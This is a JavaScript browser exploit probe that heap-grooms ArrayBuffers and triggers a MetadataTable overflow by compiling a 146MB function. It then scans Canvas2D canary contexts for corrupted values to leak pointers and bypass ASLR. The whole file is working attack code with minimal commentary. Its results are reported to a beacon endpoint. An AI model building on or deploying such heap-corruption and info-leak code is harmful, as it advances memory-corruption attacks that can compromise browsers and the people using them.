// p498 — MetadataTable overflow × Canvas context corruption probe
//
// THEORY: MetadataTable overflow writes 4.3GB forward. If Canvas2D context objects
// (~768B, FastMalloc) are at higher addresses than the MetadataTable (100,112B,
// FastMalloc), the sweep writes into context memory. Context property reads through
// JS getters would then return corrupted values, including thunk addresses (ASLR leak).
//
// DESIGN:
// Phase 1: Create 100 canary canvas contexts with unique marker values
//          (lineWidth=1000+i, miterLimit=2000+i, globalAlpha=(i+1)/200)
// Phase 2: Bait-and-switch MetadataTable overflow (p156-style)
//          Spray ABs → punch holes → GC → compile 38M function → sweep
// Phase 3: After compilation, read ALL canary properties looking for corruption
//          Any value that changed = sweep wrote into that context
//          Values at known corruption offsets (entry+24 = thunk) → ASLR leak
//
// Beacon prefix: V498-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V498-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  function hexU32(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT', navigator.userAgent);

  // ═══ PHASE 1: Create canary canvas contexts ═══
  var CANARY_COUNT = 100;
  var canaryCtx = [];
  var canaryLW = [];   // expected lineWidth
  var canaryML = [];   // expected miterLimit
  var canaryGA = [];   // expected globalAlpha

  for (var i = 0; i < CANARY_COUNT; i++) {
    var c = document.createElement('canvas');
    c.width = 4; c.height = 4;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');

    var lw = 1000.5 + i;
    var ml = 2000.5 + i;
    var ga = (i + 1) / 200;

    ctx.lineWidth = lw;
    ctx.miterLimit = ml;
    ctx.globalAlpha = ga;
    // Also set transform to known values
    ctx.setTransform(1.0 + i * 0.001, 0, 0, 1.0 + i * 0.002, 0, 0);

    canaryCtx.push(ctx);
    canaryLW.push(lw);
    canaryML.push(ml);
    canaryGA.push(ga);
  }

  B('CANARIES', CANARY_COUNT + ' contexts created');

  // ═══ PHASE 2: Bait-and-switch MetadataTable overflow ═══
  var BUF_SZ = 100112;
  var SPRAY_COUNT = 300;

  // Spray same-size ABs to fill marge bitfit pages
  var bufs = new Array(SPRAY_COUNT);
  for (var i = 0; i < SPRAY_COUNT; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
  }
  B('SPRAY', SPRAY_COUNT + ' ABs of ' + BUF_SZ);

  // Punch holes: transfer even-indexed buffers
  var transferred = 0;
  for (var i = 0; i < SPRAY_COUNT; i += 2) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      transferred++;
    } catch(e) {
      if (transferred === 0) { B('XFER-ERR', e.message.substring(0, 60)); break; }
    }
    bufs[i] = null;
  }
  B('HOLES', transferred + ' holes punched');

  // Create views on surviving (odd-indexed) buffers
  var views = [];
  for (var i = 1; i < SPRAY_COUNT; i += 2) {
    if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
      views.push(new Uint8Array(bufs[i]));
    }
  }

  // GC to free clone cells
  setTimeout(function() {
    for (var g = 0; g < 8; g++) {
      var junk = [];
      for (var j = 0; j < 30000; j++) junk.push({x: j});
      junk = null;
    }
    B('GC-DONE', 'holes should be free');

    // Build the 38M function (146MB blob)
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var rep = 'a();'.repeat(CHUNK);
    var parts = new Array(nC + 3);
    parts[0] = 'window.__p498fn=function(a){';
    for (var c = 0; c < nC; c++) parts[1 + c] = rep;
    parts[nC + 1] = 'a();'.repeat(rem);
    parts[nC + 2] = '};window.__p498ok=1;';
    rep = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB', Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('COMPILE-ERR', 'script load failed'); };
    sc.onload = function() {
      B('COMPILED', window.__p498ok ? 'OK' : 'FAIL');
      doScan();
    };
    document.head.appendChild(sc);
    sc.src = url;
  }, 300);

  function doScan() {
    // ═══ PHASE 3: Scan canary contexts for corruption ═══
    var corrupted = 0;
    var lwCorrupted = 0;
    var mlCorrupted = 0;
    var gaCorrupted = 0;
    var xfCorrupted = 0;
    var crashed = 0;
    var leakValues = [];

    for (var i = 0; i < CANARY_COUNT; i++) {
      try {
        var ctx = canaryCtx[i];
        var lw = ctx.lineWidth;
        var ml = ctx.miterLimit;
        var ga = ctx.globalAlpha;
        var xf = ctx.getTransform();

        var anyDiff = false;

        if (lw !== canaryLW[i]) {
          lwCorrupted++;
          anyDiff = true;
          // lineWidth is a double (8 bytes). If corrupted, it contains sweep data.
          // Convert to hex via Float64Array
          var f64 = new Float64Array(1);
          var u8 = new Uint8Array(f64.buffer);
          f64[0] = lw;
          var hex = '';
          for (var b = 7; b >= 0; b--) hex += ('0' + u8[b].toString(16)).slice(-2);
          leakValues.push('LW' + i + '=' + lw + '/0x' + hex);
        }
        if (ml !== canaryML[i]) {
          mlCorrupted++;
          anyDiff = true;
          var f64 = new Float64Array(1);
          var u8 = new Uint8Array(f64.buffer);
          f64[0] = ml;
          var hex = '';
          for (var b = 7; b >= 0; b--) hex += ('0' + u8[b].toString(16)).slice(-2);
          leakValues.push('ML' + i + '=' + ml + '/0x' + hex);
        }
        if (Math.abs(ga - canaryGA[i]) > 1e-10) {
          gaCorrupted++;
          anyDiff = true;
          var f64 = new Float64Array(1);
          var u8 = new Uint8Array(f64.buffer);
          f64[0] = ga;
          var hex = '';
          for (var b = 7; b >= 0; b--) hex += ('0' + u8[b].toString(16)).slice(-2);
          leakValues.push('GA' + i + '=' + ga + '/0x' + hex);
        }
        // Check transform
        var ea = 1.0 + i * 0.001;
        var ed = 1.0 + i * 0.002;
        if (xf && (Math.abs(xf.a - ea) > 1e-8 || Math.abs(xf.d - ed) > 1e-8 ||
            Math.abs(xf.b) > 1e-8 || Math.abs(xf.c) > 1e-8)) {
          xfCorrupted++;
          anyDiff = true;
          leakValues.push('XF' + i + '=a:' + xf.a + ',b:' + xf.b + ',d:' + xf.d);
        }
        if (anyDiff) corrupted++;
      } catch(e) {
        crashed++;
        leakValues.push('CRASH' + i + '=' + e.message.substring(0, 40));
      }
    }

    B('CTX-SCAN', 'total=' + corrupted + ',lw=' + lwCorrupted + ',ml=' + mlCorrupted +
      ',ga=' + gaCorrupted + ',xf=' + xfCorrupted + ',crash=' + crashed);

    // Report first 20 leak values
    for (var i = 0; i < Math.min(leakValues.length, 20); i++) {
      B('LEAK-' + i, leakValues[i]);
    }

    // ═══ Also scan AB spray buffers (same as p156) ═══
    var hitBufs = 0;
    for (var vi = 0; vi < views.length; vi++) {
      var view = views[vi];
      if (!view) continue;
      for (var q = 0; q + 16 <= view.length; q += 112) {
        if ((view[q + 12] | (view[q + 13] << 8) | (view[q + 14] << 16) |
            ((view[q + 15] << 24) >>> 0)) >>> 0 === 0xFFFFFFFF) {
          hitBufs++;
          // Extract thunk pointer at q+24
          var hex = '';
          for (var b = q + 31; b >= q + 24; b--) hex += ('0' + view[b].toString(16)).slice(-2);
          if (hitBufs <= 3) B('AB-HIT-' + hitBufs, 'off=' + q + ',thunk=0x' + hex);
          break;
        }
      }
    }
    B('AB-SCAN', 'hits=' + hitBufs);

    // ═══ Try reading fillStyle of corrupted contexts ═══
    for (var i = 0; i < CANARY_COUNT; i++) {
      try {
        var fs = canaryCtx[i].fillStyle;
        var ss = canaryCtx[i].strokeStyle;
        var sc = canaryCtx[i].shadowColor;
        if (fs !== '#000000' || ss !== '#000000') {
          B('STYLE-' + i, 'fs=' + fs + ',ss=' + ss + ',sc=' + sc);
        }
      } catch(e) {
        B('STYLE-CRASH-' + i, e.message.substring(0, 40));
      }
    }

    // ═══ Also scan fillStyle for corrupted gradient (pointer leak) ═══
    // If the sweep wrote a pointer value into the CanvasStyle variant,
    // and the variant index byte indicates Color, the getter would return
    // the pointer bytes as a color string
    for (var i = 0; i < CANARY_COUNT; i++) {
      try {
        var fs = canaryCtx[i].fillStyle;
        // Normal fillStyle is '#000000'. Any other color = corruption
        if (typeof fs !== 'string' || (fs !== '#000000' && fs !== '#00ff00')) {
          B('FSLEAK-' + i, typeof fs + ':' + String(fs).substring(0, 80));
        }
      } catch(e) {
        // fillStyle crash = variant corrupted, pointer dereference failed
        B('FSCRASH-' + i, e.message.substring(0, 40));
      }
    }

    // ═══ Final: check if any context is completely dead (state crash) ═══
    var dead = 0;
    for (var i = 0; i < CANARY_COUNT; i++) {
      try {
        canaryCtx[i].lineWidth = 999;
        var read = canaryCtx[i].lineWidth;
        if (read !== 999) dead++;
      } catch(e) {
        dead++;
      }
    }
    B('DEAD-CTX', dead + ' of ' + CANARY_COUNT);

    B('DONE', 'complete');
  }
})();
